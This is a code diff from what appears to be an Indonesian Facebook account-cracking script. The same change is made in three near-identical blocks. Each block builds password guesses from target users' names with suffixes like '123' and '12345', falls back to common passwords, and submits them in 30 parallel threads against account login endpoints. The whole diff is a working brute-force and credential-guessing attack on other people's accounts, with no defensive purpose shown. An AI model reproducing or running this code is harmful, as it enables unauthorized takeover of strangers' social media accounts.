@@ -784,18 +784,41 @@ class __crack__:
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
-            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    uid,name = yntkts.split('<=>')
-                    for xz in name.split(' '):
-                        if len(xz)>=6:
-                            memek = [ xz, xz+"123", xz+"1234", xz+"12345" ]
-                        elif len(xz)<=2:
-                            memek = [ xz+"123", xz+"1234", xz+"12345" ]
-                        elif len(xz)<=3:
-                            memek = [ xz+"123", xz+"12345" ]
+            	for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        bb = yntks.split('<=>')
+                        xz = bb[1].split(' ')
+                        if len(xz) == 1:
+                            raimuuu = [
+                                xz[0], xz[0]+'123', xz[0]+'1234',
+                                xz[0]+'12345',
+                            ]
+                        elif len(xz) == 2:
+                            raimuuu = [
+                                xz[0]+'123', xz[0]+'12345',
+                                xz[1]+'123', xz[1]+'12345',
+                            ]
+                        elif len(xz) == 3:
+                            raimuuu = [
+                                xz[0]+'123', xz[0]+'12345',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[2]+'123', xz[2]+'12345',
+                            ]
+                        elif len(xz) == 4:
+                            raimuuu = [
+                                xz[0]+'123', xz[0]+'12345',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[2]+'123', xz[2]+'12345',
+                                xz[3]+'123', xz[3]+'12345',
+                            ]
                         else:
-                            memek = [ xz+"123", xz+"12345" ]
-                        __yayanXD__.submit(self.__api__, uid, memek)
+                            raimuuu = [
+                                'sayang', 'anjing',
+                                'bismillah', '123456'
+                            ]
+                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
+                    except:
+                        pass
 
             os.remove(self.apk)
             hasil(ok,cp)
@@ -804,18 +827,41 @@ class __crack__:
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
-            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    uid,name = yntkts.split('<=>')
-                    for xz in name.split(' '):
-                        if len(xz)>=6:
-                            memek = [ xz, xz+"123", xz+"1234", xz+"12345" ]
-                        elif len(xz)<=2:
-                            memek = [ xz+"123", xz+"1234", xz+"12345" ]
-                        elif len(xz)<=3:
-                            memek = [ xz+"123", xz+"12345" ]
+            	for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        bb = yntks.split('<=>')
+                        xz = bb[1].split(' ')
+                        if len(xz) == 1:
+                            raimuuu = [
+                                xz[0], xz[0]+'123', xz[0]+'1234',
+                                xz[0]+'12345',
+                            ]
+                        elif len(xz) == 2:
+                            raimuuu = [
+                                xz[0]+'123', xz[0]+'12345',
+                                xz[1]+'123', xz[1]+'12345',
+                            ]
+                        elif len(xz) == 3:
+                            raimuuu = [
+                                xz[0]+'123', xz[0]+'12345',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[2]+'123', xz[2]+'12345',
+                            ]
+                        elif len(xz) == 4:
+                            raimuuu = [
+                                xz[0]+'123', xz[0]+'12345',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[2]+'123', xz[2]+'12345',
+                                xz[3]+'123', xz[3]+'12345',
+                            ]
                         else:
-                            memek = [ xz+"123", xz+"12345" ]
-                        __yayanXD__.submit(self.__mbasic__, uid, memek)
+                            raimuuu = [
+                                'sayang', 'anjing',
+                                'bismillah', '123456'
+                            ]
+                        __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
+                    except:
+                        pass
 
             os.remove(self.apk)
             hasil(ok,cp)
@@ -824,18 +870,41 @@ class __crack__:
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
-            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    uid,name = yntkts.split('<=>')
-                    for xz in name.split(' '):
-                        if len(xz)>=6:
-                            memek = [ xz, xz+"123", xz+"1234", xz+"12345" ]
-                        elif len(xz)<=2:
-                            memek = [ xz+"123", xz+"1234", xz+"12345" ]
-                        elif len(xz)<=3:
-                            memek = [ xz+"123", xz+"12345" ]
+            	for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        bb = yntks.split('<=>')
+                        xz = bb[1].split(' ')
+                        if len(xz) == 1:
+                            raimuuu = [
+                                xz[0], xz[0]+'123', xz[0]+'1234',
+                                xz[0]+'12345',
+                            ]
+                        elif len(xz) == 2:
+                            raimuuu = [
+                                xz[0]+'123', xz[0]+'12345',
+                                xz[1]+'123', xz[1]+'12345',
+                            ]
+                        elif len(xz) == 3:
+                            raimuuu = [
+                                xz[0]+'123', xz[0]+'12345',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[2]+'123', xz[2]+'12345',
+                            ]
+                        elif len(xz) == 4:
+                            raimuuu = [
+                                xz[0]+'123', xz[0]+'12345',
+                                xz[1]+'123', xz[1]+'12345',
+                                xz[2]+'123', xz[2]+'12345',
+                                xz[3]+'123', xz[3]+'12345',
+                            ]
                         else:
-                            memek = [ xz+"123", xz+"12345" ]
-                        __yayanXD__.submit(self.__mfb__, uid, memek)
+                            raimuuu = [
+                                'sayang', 'anjing',
+                                'bismillah', '123456'
+                            ]
+                        __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
+                    except:
+                        pass
 
             os.remove(self.apk)
             hasil(ok,cp)
